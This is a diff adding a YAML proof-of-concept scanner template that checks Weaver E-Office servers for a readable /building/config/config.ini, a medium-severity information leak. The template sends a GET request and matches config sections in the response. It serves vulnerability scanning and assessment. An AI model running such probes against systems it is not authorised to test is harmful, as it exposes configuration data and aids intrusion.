@@ -1,0 +1,14 @@
+id: poc-yaml-eoffice-building-config-information-leak
+info:
+  name: 泛微 E-Office building_config信息泄露
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: e-office
+requests:
+- method: GET
+  path: /building/config/config.ini
+  expression: status_code == 200 && contains(body, "[building]") && contains(body,
+    "[im]") && !contains(body,"<")
+variables: {}
+transport: http
